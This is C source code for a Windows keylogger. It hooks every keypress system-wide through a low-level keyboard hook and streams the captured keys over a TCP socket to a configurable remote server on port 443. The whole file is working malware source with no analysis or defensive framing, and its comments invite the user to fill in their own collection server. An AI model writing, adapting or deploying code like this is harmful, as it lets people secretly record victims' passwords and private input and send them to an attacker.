#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "172.19.42.0"  // Replace with your server's IP
#define SERVER_PORT 443           // Replace with your server's port

SOCKET sock;

// Function to map virtual key codes to their string representations
const char* get_key_name(int vkCode) {
    static char keyName[16];  // Static buffer to hold key name strings

    switch (vkCode) {
        case VK_RETURN: 
            return "[ENTER]";
        case VK_SPACE: 
            return "  ";
        case VK_CONTROL: 
            return "[CTRL]";
        case VK_SHIFT: 
            return "[SHIFT]";
        case VK_TAB: 
            return "[TAB]";
        case VK_ESCAPE: 
            return "[ESC]";
        case VK_BACK: 
            return "[BACKSPACE]";
        case VK_LEFT: 
            return "[LEFT ARROW]";
        case VK_RIGHT: 
            return "[RIGHT ARROW]";
        case VK_UP: 
            return "[UP ARROW]";
        case VK_DOWN: 
            return "[DOWN ARROW]";
        default:
            if (vkCode >= 0x30 && vkCode <= 0x5A) { // A-Z and 0-9
                snprintf(keyName, sizeof(keyName), "%c", (char)vkCode); // Use snprintf to format
                return keyName;
            }
            return NULL; // Non-printable keys
    }
}

void initialize_connection() {
    WSADATA wsaData;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        perror("Socket creation failed");
        exit(1);
    }

    // Server address setup
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        perror("Connection to server failed");
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
}

void send_key(const char *key) {
    send(sock, key, strlen(key), 0);
    Sleep(10); // Small delay to avoid flooding the server
}

LRESULT CALLBACK keyboard_hook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        const char *key_name = get_key_name(pKeyboard->vkCode);
        if (key_name) {
            send_key(key_name);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    initialize_connection(); // Initialize the socket connection

    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
    if (hook == NULL) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    closesocket(sock);
    WSACleanup();
    return 0;
}
